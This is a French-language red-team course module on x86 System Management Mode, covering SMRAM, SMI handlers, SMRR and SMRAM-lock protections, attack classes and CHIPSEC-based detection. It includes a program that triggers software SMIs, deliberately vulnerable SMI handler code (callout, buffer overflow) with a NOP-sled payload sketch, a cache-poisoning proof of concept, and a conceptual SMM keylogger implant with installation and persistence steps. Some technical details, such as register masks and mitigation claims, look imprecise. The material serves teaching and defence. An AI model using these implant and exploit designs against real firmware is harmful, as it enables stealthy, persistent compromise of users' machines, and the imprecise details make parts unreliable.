# Module A10 : SMM Basics - System Management Mode

## Objectifs pédagogiques

À la fin de ce module, tu seras capable de :
- Comprendre le SMM (System Management Mode) et son rôle
- Identifier les vulnérabilités SMM
- Exploiter les failles SMM pour l'exécution de code Ring -2
- Détecter et se protéger des attaques SMM

## Prérequis

Avant de commencer ce module, assure-toi de maîtriser :
- Architecture x86/x86-64 (rings de protection)
- UEFI et firmware (Modules A06-A09)
- Assembleur et manipulation mémoire bas niveau

## Introduction

### Qu'est-ce que le SMM ?

Le **SMM** (System Management Mode) est un mode d'exécution spécial du processeur Intel/AMD qui fonctionne au **Ring -2**, plus privilégié que le kernel (Ring 0).

```
┌─────────────────────────────────────────────────┐
│           Rings de protection CPU               │
└─────────────────────────────────────────────────┘

Ring 3  →  Applications utilisateur
Ring 0  →  Kernel OS (Windows, Linux)
Ring -1 →  Hyperviseur (VMware, Hyper-V)
Ring -2 →  SMM (System Management Mode) ← ICI
Ring -3 →  Intel ME / AMD PSP
```

**Pourquoi c'est important en Red Team ?**

Le SMM a un accès TOTAL à TOUT :
- Toute la mémoire (y compris celle du kernel)
- Tous les registres CPU
- Toutes les E/S (clavier, réseau, disque)
- Invisible pour l'OS et les hyperviseurs

## Concepts fondamentaux

### SMRAM (SMM RAM)

Le code SMM s'exécute dans une zone mémoire isolée appelée **SMRAM** (System Management RAM), complètement inaccessible depuis l'OS normal ou les hyperviseurs.

```
┌────────────────────────────────────────────────────────┐
│         Architecture SMM - Flux d'exécution            │
└────────────────────────────────────────────────────────┘

Mode normal (Ring 0-3)
  │
  ├─> Événement système (ex: appui bouton power, thermal alert)
  │
  └─> Chipset génère SMI (System Management Interrupt)
      │
      ├─> CPU sauvegarde TOUT son contexte dans SMRAM
      │   (registres, flags, état mémoire)
      │
      ├─> CPU bascule en SMM mode
      │   └─> Désactive paging, segmentation simplifiée
      │
      ├─> CPU exécute code dans SMRAM (0xA0000-0xBFFFF legacy ou TSEG)
      │   └─> SMI Handler s'exécute
      │
      └─> Instruction RSM (Resume from SMM)
          ├─> Restaure le contexte CPU
          └─> Retour au mode normal
```

**SMRAM Regions :**

| Région | Adresse | Taille | Description |
|--------|---------|--------|-------------|
| **Legacy SMRAM** | 0xA0000-0xBFFFF | 128 KB | Ancienne zone VGA, rarement utilisée maintenant |
| **TSEG** | Variable (ex: 0xFED00000) | 1-8 MB | TSEG (Top of System Memory), zone moderne |

**TSEG (Top Segment) :**

Le TSEG est la zone SMRAM moderne, située juste sous la mémoire système.

```
┌────────────────────────────────────────────┐
│      Mémoire physique avec TSEG            │
└────────────────────────────────────────────┘

0x00000000  ┌────────────────────────────┐
            │  Mémoire système (OS)       │
            │  4 GB RAM                   │
            │                             │
0xFED00000  ├────────────────────────────┤ ← TSEG Base
            │  SMRAM (TSEG)               │
            │  2 MB                       │
            │  [INACCESSIBLE depuis OS]   │
0xFEF00000  ├────────────────────────────┤ ← TSEG Limit
            │  MMIO (devices)             │
0xFFFFFFFF  └────────────────────────────┘
```

---

## Partie 2 : SMI Handlers - Les gestionnaires SMM

### Qu'est-ce qu'un SMI Handler ?

Un **SMI Handler** est une fonction firmware UEFI/BIOS qui s'exécute en réponse à un SMI.

**Exemples de SMI Handlers :**

- **Power Management** : Gestion de l'alimentation (suspend, hibernate)
- **Thermal Management** : Contrôle de la température CPU
- **SW SMI** : SMI déclenchés par software (via port I/O 0xB2)
- **USB Legacy Support** : Émulation clavier/souris USB en mode legacy

**Déclencher un SW SMI :**

```c
#include <sys/io.h>  // Linux : ioperm, outb

// Déclencher un SW SMI avec le code 0x42
int main() {
    // Demander l'accès au port 0xB2
    if (ioperm(0xB2, 1, 1) != 0) {
        perror("ioperm");
        return 1;
    }

    // Écrire dans le port SMI
    outb(0x42, 0xB2);  // 0xB2 = SMI Command Port

    return 0;
}
```

**Compilation et exécution :**

```bash
gcc -o trigger_smi trigger_smi.c
sudo ./trigger_smi
# → Déclenche un SMI avec le code 0x42
```

**⚠ Attention :** Déclencher des SMI arbitraires peut crasher le système si le handler n'existe pas.

---

## Partie 3 : Protections SMRAM

### SMRR (SMM Range Registers)

Les **SMRR** sont des registres CPU qui protègent la SMRAM contre les accès depuis le mode non-SMM.

```
┌────────────────────────────────────────────┐
│         SMRR Protection                    │
└────────────────────────────────────────────┘

SMRR_BASE  = 0xFED00000
SMRR_MASK  = 0xFFF00000 (2 MB)
SMRR_VALID = 1

Protection :
  ├─> Si CPU en mode non-SMM :
  │   └─> Tout accès à [SMRR_BASE, SMRR_BASE+2MB] → #GP (General Protection Fault)
  │
  └─> Si CPU en mode SMM :
      └─> Accès autorisé normalement
```

**Vérifier SMRR avec CHIPSEC :**

```bash
sudo chipsec_main -m common.smrr

# Sortie attendue :
# [+] SMRR range protection is enabled
# [+] SMRR_PHYS_BASE = 0xFED00000
# [+] SMRR_PHYS_MASK = 0xFFF00000
```

**Si SMRR n'est pas activé :**

```
# [!] SMRR range protection is not enabled
# [!] SMRAM is vulnerable to DMA attacks
```

→ La SMRAM peut être lue/écrite depuis l'OS (via DMA ou cache attacks).

---

### D_LCK (SMM_BWP - SMRAM Lock)

Le **D_LCK** bit verrouille la configuration SMRAM jusqu'au prochain reboot.

```c
// Pseudo-code de vérification D_LCK
uint8_t smramc = pci_read_byte(0, 0, 0, 0x88);  // SMRAMC register

if (smramc & (1 << 4)) {  // D_LCK bit
    printf("SMRAM configuration is locked\n");
} else {
    printf("SMRAM configuration is UNLOCKED (vulnerable)\n");
}
```

**Vérifier avec CHIPSEC :**

```bash
sudo chipsec_main -m common.smm

# Sortie attendue :
# [+] D_LCK is set
# [+] SMRAM is locked
```

---

## Partie 4 : Attaques SMM

### 4.1 - SMRAM Cache Poisoning

**Principe :**

Exploiter le cache CPU pour lire/écrire la SMRAM malgré les SMRR.

**Scénario :**

1. La SMRAM est en TSEG (0xFED00000-0xFEF00000)
2. SMRR est activé → Accès direct interdit
3. **Mais** : Le cache CPU peut contenir des lignes SMRAM
4. Attaque : Forcer le CPU à cacher des lignes SMRAM, puis les lire via le cache

**PoC conceptuel (très difficile en pratique) :**

```c
// Nécessite un exploit kernel pour mapper SMRAM
// + manipulation avancée du cache

#include <x86intrin.h>

#define SMRAM_BASE 0xFED00000

void cache_poison_smram() {
    volatile uint8_t* smram = (volatile uint8_t*)SMRAM_BASE;

    // Tenter de mettre SMRAM en cache (normalement bloqué par SMRR)
    _mm_clflush((void*)smram);
    _mm_prefetch((void*)smram, _MM_HINT_T0);  // Prefetch dans L1 cache

    // Si succès, lire depuis le cache
    uint8_t value = *smram;  // Devrait causer #GP, sauf si cache hit

    printf("SMRAM byte read: 0x%02X\n", value);
}
```

**Mitigations modernes :**

- **Cache monitoring** : Les CPU récents détectent et bloquent ces attaques
- **Enhanced SMRR** : Protège aussi contre les attaques cache

---

### 4.2 - SMM Callout Vulnerability

**Principe :**

Un SMI handler appelle du code **en dehors de SMRAM** (dans la mémoire OS), que l'attaquant peut contrôler.

**Exemple vulnérable :**

```c
// Code SMI handler (s'exécute en SMRAM)
void SmiHandler(void* context) {
    // Vulnérabilité : appelle une fonction pointée par un paramètre
    void (*callback)(void) = (void(*)(void))context;

    callback();  // ← SI context pointe vers mémoire OS → exploitation !
}
```

**Exploitation :**

1. Attaquant configure `context` pour pointer vers son shellcode en mémoire OS
2. Déclenche le SMI
3. Le SMI handler exécute le shellcode **en mode SMM** (Ring -2) !

**Résultat :**

- Exécution de code en Ring -2
- Accès complet à SMRAM
- Installation d'un rootkit SMM persistant

**Détection avec CHIPSEC :**

```bash
sudo chipsec_main -m common.smm_code_chk

# Sortie attendue :
# [+] No SMM call-out vulnerabilities detected
```

**Si vulnérable :**

```
# [!] SMI handler at 0xFED12345 calls code outside SMRAM
# [!] Potential SMM call-out vulnerability
```

---

### 4.3 - Buffer Overflow dans SMI Handler

**Scénario :**

Un SMI handler copie des données utilisateur sans vérification de taille.

**Code vulnérable (exemple simplifié) :**

```c
// SMI Handler (firmware)
void SmiHandlerCopy(uint8_t* user_buffer, size_t size) {
    uint8_t smram_buffer[256];

    // Vulnérabilité : pas de vérification de size
    memcpy(smram_buffer, user_buffer, size);  // ← Buffer overflow si size > 256

    // Traitement...
}
```

**Exploitation :**

```c
// Depuis l'OS (root)
uint8_t payload[512];  // Plus grand que 256
memset(payload, 0x90, sizeof(payload));  // NOP sled
// payload[256...511] = shellcode

// Déclencher le SMI avec le payload
trigger_smi_with_buffer(payload, sizeof(payload));
```

**Résultat :**

- Écrase la stack SMRAM
- ROP chain pour exécuter du code arbitraire en SMM

---

## Partie 5 : Exploitation avancée - SMM Rootkit

### Installer un hook persistant en SMRAM

**Objectif :**

Hooker un SMI handler pour intercepter toutes les frappes clavier (keylogger hardware-level).

**Concept :**

```
┌────────────────────────────────────────────┐
│      SMM Keylogger Hook                    │
└────────────────────────────────────────────┘

SMI Keyboard Handler (original)
  │
  ├─> Lire le scancode du clavier (port 0x60)
  │
  └─> Passer le scancode au BIOS/OS

SMI Keyboard Handler (hookés)
  │
  ├─> Lire le scancode
  │
  ├─> Logger le scancode dans SMRAM
  │   └─> Exfiltrer périodiquement (DMA, réseau, etc.)
  │
  └─> Passer le scancode (comportement normal)
```

**Code conceptuel (implant SMM) :**

```c
// Implant à injecter dans SMRAM
void HookedKeyboardSmiHandler() {
    // Lire le scancode du clavier
    uint8_t scancode = inb(0x60);

    // Logger dans une zone SMRAM dédiée
    static uint8_t keylog_buffer[4096];
    static int keylog_index = 0;

    if (keylog_index < sizeof(keylog_buffer)) {
        keylog_buffer[keylog_index++] = scancode;
    }

    // Appeler le handler original pour ne pas casser le clavier
    OriginalKeyboardSmiHandler();
}
```

**Installation (nécessite exploit SMM ou accès physique) :**

1. Dumper SMRAM via un exploit ou programmeur hardware
2. Trouver l'adresse du SMI handler clavier
3. Patcher le handler pour jump vers `HookedKeyboardSmiHandler`
4. Reflasher SMRAM

**Persistance :**

- Survit à tout reboot OS
- Invisible pour l'OS (Ring -2)
- Détection extrêmement difficile

---

## Partie 6 : Détection et défense

### Outils de détection

**1. CHIPSEC - Framework de sécurité firmware**

```bash
# Installation
git clone https://github.com/chipsec/chipsec.git
cd chipsec
sudo python setup.py install

# Tests SMM
sudo chipsec_main -m common.smm          # Vérifier locks SMRAM
sudo chipsec_main -m common.smrr         # Vérifier SMRR
sudo chipsec_main -m common.smm_code_chk # Détecter call-outs
sudo chipsec_main -m smm_dma             # Vérifier protection DMA
```

**2. Dumper et analyser SMRAM**

```bash
# Dumper SMRAM (nécessite exploit ou tool spécifique)
sudo chipsec_util smram dump -f smram.bin

# Analyser avec IDA Pro / Ghidra
# → Reverse engineering des SMI handlers
```

**3. Monitoring des SMI**

```bash
# Compter les SMI (via MSR)
sudo rdmsr 0x34  # IA32_SMI_COUNT (si disponible)

# Profiler les SMI avec perf
sudo perf stat -e 'msr/event=0x3c,umask=0x0/' sleep 10
```

---

### Défenses

**1. Activer SMRR**

Vérifier que le firmware active les SMRR au boot.

```bash
sudo chipsec_main -m common.smrr
# → Doit afficher "SMRR range protection is enabled"
```

**2. Verrouiller SMRAM (D_LCK)**

Assurer que le firmware set le bit D_LCK après configuration.

**3. Code review des SMI handlers**

- Éviter les call-outs (appels hors SMRAM)
- Valider toutes les entrées utilisateur
- Utiliser des tailles de buffer fixes

**4. Mesures TPM**

Le TPM peut mesurer les régions SMRAM au boot (via PCR 0-7).

```bash
sudo tpm2_pcrread sha256:0,1,2,3,4,5,6,7
# → Vérifier que les PCR correspondent à une baseline connue
```

## Application offensive

### Persistance Ring -2

Un implant SMM offre :
- Persistance maximale (survit à tout reboot OS)
- Invisibilité totale (hors scope de l'OS)
- Accès complet mémoire/hardware

### Détection

**Outils :**
```bash
# CHIPSEC - Vérifier les protections SMRAM
sudo chipsec_main -m common.smrr
sudo chipsec_main -m common.smm

# Vérifier SMRAM lock
sudo chipsec_util mmio read 0xFED1F848
```

## Résumé

- SMM = Ring -2, plus privilégié que le kernel
- SMRAM = zone mémoire isolée pour le code SMM
- Vulnérabilités SMM = accès total au système
- Protection : SMRR (SMM Range Registers), SMRAM lock
- Détection : CHIPSEC, monitoring SMI handlers

## Ressources complémentaires

- **CHIPSEC SMM Tests** : https://github.com/chipsec/chipsec
- **SMM Rootkit** : https://www.blackhat.com/presentations/bh-usa-08/Zovi/BH_US_08_Zovi_Reverse_Rootkits.pdf
- **Intel SMM Documentation** : https://www.intel.com/content/www/us/en/architecture-and-technology/intel-sdm.html

---

**Module suivant** : [A11 - Side Channel Intro](../../PHASE_A03_HARDWARE/A11_side_channel_intro/)
